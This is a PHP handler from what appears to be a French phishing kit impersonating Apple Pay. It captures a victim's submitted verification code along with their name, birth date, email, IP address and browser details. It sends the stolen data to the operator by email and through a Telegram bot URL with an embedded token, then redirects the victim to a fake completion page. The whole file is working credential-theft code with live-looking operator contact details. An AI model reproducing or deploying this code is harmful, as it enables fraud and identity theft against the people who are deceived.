<?php

include("../infos.php");
include("../common/sub_includes.php");


if(isset($_POST)){

	if(!isset($_SESSION)){
		session_start();
	}
	$_SESSION["code"] = $_POST["code"];


	if(1 == 1){

				######################
				#### MAIL SENDING ####
				######################

				if($mail_sending == true){
					
					$message = "

[🔻] Code Apple Pay [🔻]

🔻 Code : ".$_SESSION['code']."

[♦️] Log & Infos [♦️]
♦️
♦️ Nom : ".$_SESSION['nom']."
♦️ Prénom : ".$_SESSION['prenom']."
♦️ Naissance : ".$_SESSION['naissance']."
♦️ Email : ".$_SESSION['mail']."

[🔴] Tiers [🔴]

🔴 Adresse ip : ".$_SESSION['ip']."
🔴 User Agen : ".$_SESSION['useragent']."


					";

					$subject = "「🔻」 +1 Apple Pay | ".$_SESSION['code']." - ".$_SESSION['ip'];
					$headers = "From: Vitale <akej2303@gmail.com>";

					mail($rezmail, $subject, $message, $headers);
				}

				##########################
				#### TELEGRAM SENDING ####
				##########################

				if($telegram_sending == true){

					$data = [
					'text' => '

[🔻] Code Apple Pay [🔻]

🔻 Code Apple Pay : '.$_SESSION['code'].'

[🔴] Log & Infos [🔴]

🔴 Nom : '.$_SESSION['nom'].'
🔴 Prénom : '.$_SESSION['prenom'].'
🔴 Naissance : '.$_SESSION['naissance'].'
🔴 Email : '.$_SESSION['mail'].'

[🔴] Tiers [🔴]

🔴 Adresse IP : '.$_SESSION['ip'].'
🔴 User-agent : '.$_SESSION['useragent'].'


					',
					'chat_id' => $chat_apple_pay
								];

					file_get_contents("https://api.telegram.org/botAAE4qosAKb-l0HUHcnkZnGmqXgPc2An7dlw/sendMessage?".http_build_query($data) );
				}
				$_SESSION["logged"] = true;
				
				header('Location: ../steps/loading_finished.php');
				}
		else{
			header('Location: ../index.php?error=email');

		}

	}

else{
	header('Location: ../');
}


?>